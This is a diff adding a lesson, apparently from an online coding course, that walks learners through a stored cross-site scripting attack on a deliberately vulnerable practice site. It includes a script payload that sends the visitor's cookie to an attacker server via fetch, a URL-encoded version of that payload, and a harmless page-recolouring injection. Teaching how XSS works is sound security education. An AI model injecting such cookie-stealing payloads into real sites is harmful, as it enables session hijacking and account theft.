@@ -1,0 +1,50 @@
+PREVENTING CROSS-SITE SCRIPTING (XSS) ATTACKS
+Stored XSS Attack
+In this exercise, we’ll take a look at how to perform a Stored XSS Attack.
+
+When a victim clicks a link, malicious code can send the victim’s cookie to another server or directly modify the affected site to steal usernames, passwords, or implement other phishing techniques.
+
+Let’s assume we have a vulnerable site, www.roomcademy.com, that provides vacation rentals across the world. Each lodging has a page where customers can review their stay in a comment field. So, how can an attacker take advantage of this site?
+
+If an attacker hosts their own server at, www.localhost:5000, they can inject code into that comment field in order to “infect” the site and run malicious code whenever someone requests to see the comments. Since comments are saved in RoomCademy’s database, this script is stored, and will be retrieved and run whenever a user accesses the comment section. One example could be, instead of writing a review, the attacker writes the following:
+
+<script>fetch(`http://localhost:5000?data=${document.cookie}`)</script>
+
+In the code above, they’re making a fetch request to the attacker’s server and sending the victim’s cookie. We’re also using encodeURIComponent in order to parse the text and format it so that it’s read as a query parameter in the URL:
+
+http://rentaroom.com/?newReview=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A5000%3Fdata%3D%24%....Fscript%3E
+
+Once the attacker submits this “review”, RoomCademywill store the code in their database. Now, whenever a victim visits the page and retrieves the comments, this code will be run and executed, sending the victim’s information to the attacker’s server.
+
+Instructions
+Checkpoint 1 Passed
+1.
+We have provided you with a vulnerable site that hasn’t been secured and isn’t sanitizing request queries. Take a look at app.js and index.html to see where possible vulnerabilities lie.
+
+Press Check Work once you think you’ve found the vulnerable code.
+
+
+Hint
+The current site is using an array as a database. Also, take a look at the app.get('/') request to see how the data is being stored.
+
+Checkpoint 2 Passed
+2.
+Type node app.js into the Terminal to start the node server. Make sure to refresh the mini-browser.
+
+Where do you think you can enter malicious code so that it will be stored by the application?
+
+Press Check Work once you think you’ve found the vulnerable area in the mini-browser.
+
+
+Hint
+The review field is currently not being sanitized, and an attacker could inject malicious code through that request.
+
+Checkpoint 3 Passed
+3.
+In the mini-browser, scroll down to the review section and inject the following code:
+
+<script>document.body.style.background = "red"</script>
+
+Once submitted, the background color of the application should suddenly change to red! This code will then be stored whenever a user requests to view that review, and the code will be executed on their end.
+
+Press Check Work once you think you’ve successfully hacked the mini browser.
